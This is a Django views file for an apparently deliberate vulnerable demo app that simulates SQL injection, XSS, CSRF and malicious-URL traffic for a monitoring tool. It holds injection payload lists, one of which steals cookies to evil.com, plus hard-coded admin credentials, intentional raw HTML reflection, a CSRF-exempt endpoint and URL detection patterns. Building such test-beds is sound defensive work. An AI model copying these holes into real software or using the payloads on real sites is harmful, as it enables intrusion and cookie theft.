import re
from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

# ── Existing views ────────────────────────────────────────────────────────────

def home(request):
    return render(request, 'home.html')

def login(request):
    message = ''
    if request.method == 'POST':
        username = request.POST.get('username', '')
        password = request.POST.get('password', '')
        if username == 'admin' and password == 'admin123':
            message = 'Login successful!'
        else:
            message = 'Invalid credentials.'
    return render(request, 'login.html', {'message': message})

def search(request):
    query = request.GET.get('q', '')
    results = []
    if query:
        results = [f'Result for: {query}', 'Article 1', 'Article 2']
    return render(request, 'search.html', {'query': query, 'results': results})

def admin_panel(request):
    return render(request, 'admin_panel.html')

def api_data(request):
    return JsonResponse({'status': 'ok', 'data': [1, 2, 3]})

# ── DDoS simulation ───────────────────────────────────────────────────────────

def ddos(request):
    return render(request, 'ddos.html')

# ── SQL Injection simulation ──────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT 1,2,3 --",
    "'; DROP TABLE users; --",
    "' AND SLEEP(5) --",
    "admin'--",
]

def sqli(request):
    return render(request, 'sqli.html', {'payloads': SQLI_PAYLOADS, 'query': ''})

# ── XSS simulation ────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(document.cookie)>',
    'javascript:alert("XSS")',
    '"><script>fetch("http://evil.com?c="+document.cookie)</script>',
]

def xss(request):
    reflected = False
    raw_comment = ''
    reflected_html = ''
    if request.method == 'POST':
        raw_comment = request.POST.get('comment', '')
        reflected = True
        # Intentionally reflect raw HTML (unsafe — demo only)
        reflected_html = raw_comment
    return render(request, 'xss.html', {
        'payloads': XSS_PAYLOADS,
        'reflected': reflected,
        'raw_comment': raw_comment,
        'reflected_html': reflected_html,
    })

# ── CSRF simulation ───────────────────────────────────────────────────────────

def csrf_demo(request):
    return render(request, 'csrf.html')

@csrf_exempt
def csrf_target(request):
    if request.method == 'POST':
        action = request.POST.get('action', '')
        amount = request.POST.get('amount', '')
        has_token = bool(request.POST.get('csrfmiddlewaretoken', ''))
        return JsonResponse({
            'status': 'received',
            'action': action,
            'amount': amount,
            'csrf_token_present': has_token,
            'note': 'This endpoint accepted the request — PHAGE should have already logged it.',
        })
    return render(request, 'csrf.html')

# ── Malicious URL simulation ──────────────────────────────────────────────────

MALICIOUS_URL_TARGETS = [
    ('Phishing clone',       'http://paypa1-secure-login.xyz/verify'),
    ('Malware payload',      'http://cdn-fast-update.ru/setup.exe'),
    ('C2 beacon',            'http://185.220.101.42/cmd?id=infected'),
    ('Typosquatting',        'http://goog1e-login.com/accounts'),
    ('Encoded payload',      'http://evil.com/x?cmd=base64_encoded_shell'),
    ('Suspicious subdomain', 'http://a1b2c3d4e5f6.ngrok.io/admin'),
]

_SUSPICIOUS_PATTERNS = [
    (r'\.(exe|bat|cmd|sh|ps1|vbs|jar)(\?|$)', 'executable payload'),
    (r'paypa[l1]|paypa[l1]-', 'phishing (PayPal spoof)'),
    (r'goog[l1]e-|go0gle', 'phishing (Google spoof)'),
    (r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'raw IP address (no domain)'),
    (r'\b(ngrok|tunnel|localtunnel)\b', 'tunneling service'),
    (r'cmd=|shell=|exec=|payload=', 'command injection parameter'),
    (r'[a-f0-9]{20,}', 'suspicious long hex string'),
    (r'\.(ru|xyz|tk|pw|cc|top)(\/|$)', 'high-risk TLD'),
]

def malicious_url(request):
    target = request.GET.get('target', '')
    if not target:
        return render(request, 'malicious_url.html', {
            'targets': MALICIOUS_URL_TARGETS,
        })

    verdict = 'CLEAN'
    reason  = 'No known malicious patterns detected.'
    blocked = False

    for pattern, label in _SUSPICIOUS_PATTERNS:
        if re.search(pattern, target, re.IGNORECASE):
            verdict = 'MALICIOUS'
            reason  = f'Matched pattern: {label}'
            blocked = True
            break

    return JsonResponse({'target': target, 'verdict': verdict, 'reason': reason, 'blocked': blocked})
